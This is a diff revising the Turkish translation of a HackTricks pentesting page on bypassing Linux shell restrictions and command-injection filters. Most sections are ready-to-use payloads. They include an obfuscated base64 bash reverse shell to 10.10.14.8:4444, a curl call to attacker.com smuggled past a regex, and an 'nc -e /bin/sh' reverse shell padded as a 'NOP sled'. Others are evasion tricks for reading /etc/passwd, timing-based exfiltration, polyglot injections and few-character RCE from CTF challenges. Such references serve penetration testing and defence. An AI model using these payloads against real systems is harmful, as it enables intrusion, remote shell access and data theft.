@@ -1,18 +1,23 @@
-# Linux Restrictions Bypass
+# Linux Kısıtlamalarını Aşma
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Yaygın Limitasyon Bypass'ları
+## Yaygın Kısıtlamaları Aşma Yöntemleri
 
-PayloadsAllTheThings, Bo0oM's cheat sheet'i ve bağlantısı verilen iki Secjuice makalesindeki command-injection ve WAF-evasion koleksiyonları, bu bölümdeki shell-syntax varyasyonları hakkında arka plan bilgisi sağlar.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+PayloadsAllTheThings, Bo0oM'un cheat sheet'i ve bağlantısı verilen iki Secjuice makalesindeki command-injection ve WAF-evasion koleksiyonları, bu bölümdeki shell sözdizimi farklılıkları hakkında arka plan bilgisi sağlar.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+
+Bir shell sink'i belirlemek ve blind execution'ı doğrulamak için [Command Injection](../../../pentesting-web/command-injection.md) sayfasına bakın.
 
 ### Reverse Shell
+
 ```bash
 # Double-Base64 payload
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Kısa Rev shell
+
+### Short Rev shell
+
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -20,7 +25,9 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Bypass Yolları ve yasaklı kelimeler
+
+### Bypass yolları ve yasaklı kelimeler
+
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -80,7 +87,9 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Yasaklı boşlukları atlatma
+
+### Yasaklanmış boşlukları atlatma
+
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -107,47 +116,73 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Backslash ve slash atlatma
+
+### Backslash ve slash bypass'ı
+
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Pipe'ları Bypass Etme
+
+### Pipe'ları bypass etme
+
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Hex encoding ile Bypass
+
+### Hex encoding ile bypass
+
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
-abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat "$abc"
 `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
 cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
+
+### Sekizlik kaçışlarla harf içermeyen komut adları
+
+Bash'in ANSI-C `$'...'` alıntılaması, komut sözcüğü oluşturulurken sekizlik kaçışları çözümler.<sup>[[7]](#references)</sup>
+
+Bu nedenle, `$`, tek tırnak, ters eğik çizgi, rakamlar ve komut ayırıcısına hâlâ izin veriyorsa harf engelleme listesi etkisiz kalabilir. Bu yöntem, doğru şekilde alıntılanmış bir veri argümanı olarak iletilen girdiyi atlatmaz.<sup>[[13]](#references)</sup>
+
+Bu yerel testte, `:` önceki komutu temsil eder ve `\151\144`, `id` olarak çözülür.<sup>[[7]](#references)</sup> Sözcük ayırıcı kullanılabiliyorsa argümanlar ayrı sözcükler olarak kodlanabilir.<sup>[[13]](#references)</sup>
+
+```bash
+:;$'\151\144'
+```
+
 ### IP'leri Bypass Etme
+
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Zamana dayalı veri sızdırma
+
+### Zaman tabanlı veri sızdırma
+
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
+
 ### Ortam Değişkenlerinden Karakter Alma
+
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS veri exfiltration
 
-Out-of-band callback'ler için Burp Collaborator gibi collaborator tarzı bir servis, hedef uygulamanın harici bir sunucuyla etkileşime girmesini sağlayabilir; mevcut [**pingb**](http://pingb.in) linki, güncel bir erişilebilirlik iddiası olarak değil, geçmişten kalan bir navigation olarak korunmuştur.<sup>[[6]](#references)</sup>
+### DNS data sızdırma
 
-### Yerleşik komutlar
+Out-of-band callback'ler için Burp Collaborator gibi collaborator tarzı bir hizmet, hedef uygulamanın harici bir sunucuyla etkileşime geçmesini sağlayabilir; mevcut [**pingb**](http://pingb.in) bağlantısı güncel erişilebilirlik iddiası olarak değil, geçmişten kalan bir yönlendirme olarak korunmuştur.<sup>[[6]](#references)</sup>
 
-Kısıtlı bir shell'de kullanılabilen yerleşik komutlar, bu örneklerde kalan komut yüzeyidir; Bash, yerleşik komutlarını ve çalıştırma söz dizimini belgeler.<sup>[[7]](#references)</sup> Fikir [**devploit**](https://twitter.com/devploit)'ten alınmıştır.\
-Mevcut [**shell yerleşik komutları**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) navigation'ıyla başlayın, ardından Bash'e özgü aşağıdaki teknikleri deneyin:<sup>[[7]](#references)</sup>
+### Builtin komutlar
+
+Kısıtlı bir shell'de kullanılabilir builtin komutlar, bu örneklerde kullanılabilecek geriye kalan komut yüzeyidir; Bash, builtin komutlarını ve yürütme dilbilgisini belgeler.<sup>[[7]](#references)</sup> Fikir [**devploit**](https://twitter.com/devploit)'ten.\
+Mevcut [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) yönlendirmesiyle başlayın, ardından Bash'e özgü şu teknikleri deneyin:<sup>[[7]](#references)</sup>
+
 ```bash
 # Get list of builtins
 declare builtins
@@ -199,26 +234,34 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
+
 ### Polyglot command injection
+
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
+
 ### Potansiyel regex'leri bypass etme
+
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
+
 ### Bashfuscator
 
-Aşağıdaki invocation, açık kaynaklı bir Bash obfuscation framework'ü olan Bashfuscator'ı kullanır; code comment içindeki repository link'i navigation amacıyla korunmuştur.<sup>[[8]](#references)</sup>
+Aşağıdaki çağrı, açık kaynaklı bir Bash obfuscation framework’ü olan Bashfuscator’ı kullanır; kod yorumundaki repository bağlantısı gezinme amacıyla korunmuştur.<sup>[[8]](#references)</sup>
+
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
+
 ### 5 karakterle RCE
 
-Aşağıdaki iki tarihî 5 karakterli örnek, challenge reproductions olarak korunmuştur: birincil challenge repository’sine [Orange Tsai’s repository](https://github.com/orangetw/My-CTF-Web-Challenges) üzerinden erişilebilir; code block içindeki ikinci write-up linki ise güncel erişilebilirliği doğrulanmamış bir navigation bağlantısıdır.<sup>[[9]](#references)</sup>
+Aşağıdaki iki tarihî 5 karakterlik örnek, meydan okuma yeniden üretimleri olarak korunmuştur: birincil meydan okuma deposuna [Orange Tsai’nin deposundan](https://github.com/orangetw/My-CTF-Web-Challenges) ulaşılabilir; kod bloğundaki ikinci write-up bağlantısı ise mevcut erişilebilirliği doğrulanmamış bir gezinme bağlantısıdır.<sup>[[9]](#references)</sup>
+
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -265,7 +308,9 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
+
 ### 4 karakterle RCE
+
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -300,15 +345,16 @@ ln /f*
 'sh x'
 'sh g'
 ```
+
 ## Read-Only/Noexec/Distroless Bypass
 
-**read-only ve noexec korumalarına** sahip bir dosya sistemi içindeyseniz veya bir **distroless image** kullanıyorsanız, ortam Linux `mount(8)` ve Distroless projesi tarafından belgelenen yürütme kısıtlamaları uygular; bağlantıdaki sayfa bu kısıtlar dahilinde çalışmaya yönelik teknikleri derler.<sup>[[11]](#references)[[12]](#references)</sup>
+**read-only ve noexec korumalarına** sahip bir dosya sistemindeyseniz veya **distroless bir image** içindeyseniz, ortam Linux `mount(8)` ve Distroless projesinin belgelediği yürütme kısıtlamaları uygular; bağlantı verilen sayfada bu kısıtlamalarla çalışmaya yönelik teknikler yer alır.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot ve diğer Jail Bypass
+## Chroot & diğer Jail Bypass'ları
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -316,36 +362,41 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Bir zafiyet, sonunda `system()` veya başka bir shell'e ulaşan bir argümanı kısmen kontrol etmenize izin verdiğinde, payload offset'i belirsiz olabilir. Alan Cao ve Will Tan, shell payload'ının memory-mapped NVRAM'e yayıldığı ve önüne boşluklar eklendiği, kısıtlı bir embedded-device senaryosunu açıklamaktadır.<sup>[[5]](#references)</sup>
+Bir güvenlik açığı, sonunda `system()` veya başka bir shell'e ulaşan bir argümanı kısmen kontrol etmenize olanak tanıyorsa payload'ın konumu belirsiz olabilir. Alan Cao ve Will Tan, shell payload'ının memory-mapped NVRAM'e püskürtüldüğü ve önüne boşluklar eklendiği, kısıtlı bir gömülü cihaz senaryosunu anlatıyor.<sup>[[5]](#references)</sup>
 
-Bu nedenle gerçek komutunuzun önüne uzun bir boşluk veya tab karakteri dizisi ekleyerek *Bash için bir NOP sled* oluşturabilirsiniz; Bash, boşlukları ve tab'ları basit bir komutta sözcükleri ayıran blank karakterleri olarak tanımlar.<sup>[[5]](#references)[[7]](#references)</sup>
+Bu nedenle, gerçek komutunuzun önüne uzun bir boşluk veya tab karakteri dizisi ekleyerek *Bash için bir NOP sled* oluşturabilirsiniz; Bash, basit bir komutta sözcükleri ayıran boşluklar olarak boşluk ve tab karakterlerini tanımlar.<sup>[[5]](#references)[[7]](#references)</sup>
+
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Bir ROP chain'i (veya başka bir memory-corruption primitive'i), space block içinde herhangi bir noktadan başlayan bir command-string pointer'ı geçirirse Bash, komuta ulaşana kadar kalan baştaki boşlukları parse edebilir; alıntılanan router exploit'inde bu durum, belirsiz string offset'lerinin kullanılabilmesini sağladı.<sup>[[5]](#references)[[7]](#references)</sup>
 
-Kısıtlı embedded hedeflerdeki pratik kullanım alanları şunları içerir:<sup>[[5]](#references)</sup>
+Bir ROP chain (veya başka bir memory-corruption primitive), space block içindeki herhangi bir noktadan başlayan bir command-string pointer geçirirse Bash, komuta ulaşana kadar baştaki boşlukları ayrıştırabilir; atıfta bulunulan router exploit'inde bu, belirsiz string offset'lerinin kullanılmasını sağladı.<sup>[[5]](#references)[[7]](#references)</sup>
 
-1. **Memory-mapped configuration blob'ları** (ör. NVRAM); bunlara process'ler arası erişilebilir.<sup>[[5]](#references)</sup>
-2. Saldırganın payload'ı hizalamak için NULL byte'lar yazamadığı payload kanalları (alignment problem'inin genel bir uyarlaması).<sup>[[5]](#references)</sup>
-3. Kaynakları kısıtlı sistemlerde BusyBox'ın applet'ler olarak belgelediği, küçük bir BusyBox `ash`/`sh` ortamına sahip embedded cihazlar.<sup>[[10]](#references)</sup>
+Kısıtlı gömülü hedeflerdeki pratik kullanım alanları şunlardır:<sup>[[5]](#references)</sup>
 
-> 🛠️ Bu tekniği, kontrollü bir laboratuvarda `system()` çağıran ROP gadget'larıyla birleştirin; alıntılanan router araştırması, bu kombinasyonu kısıtlı donanım üzerinde göstermektedir.<sup>[[5]](#references)</sup>
+1. **Memory-mapped configuration blob'ları** (ör. NVRAM); bunlara süreçler arası erişilebilir.<sup>[[5]](#references)</sup>
+2. Saldırganın payload'u hizalamak için NULL byte yazamadığı payload kanalları (alignment probleminin genel bir uyarlaması).<sup>[[5]](#references)</sup>
+3. Kaynak kısıtlı sistemlerde BusyBox'ın applet'ler olarak belgelediği, küçük bir BusyBox `ash`/`sh` ortamına sahip gömülü cihazlar.<sup>[[10]](#references)</sup>
+
+> 🛠️  Bu tekniği, kontrollü bir lab ortamında `system()` çağıran ROP gadget'larıyla birleştirin; atıfta bulunulan router araştırması, bu kombinasyonun kısıtlı donanımdaki kullanımını gösteriyor.<sup>[[5]](#references)</sup>
+
+
 
 ## References
 
 - [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Alan Cao ve Will Tan — Terk edilmiş donanımlarda zero-day'leri Exploit Etmek – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [3] [Web Application Firewall (WAF) Kaçınma Teknikleri #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Kaçınma Teknikleri #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Alan Cao ve Will Tan — Terk edilmiş donanımlarda zero-day açıklarını istismar etme – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
-- [7] [bash(1) — Linux manual page](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [7] [bash(1) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
 - [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
 - [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
-- [11] [mount(8) — Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [11] [mount(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
+- [13] [Dojo CTF #36: Shell Escape çözüm yazısı — YesWeHack](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-36)
 {{#include ../../../banners/hacktricks-training.md}}
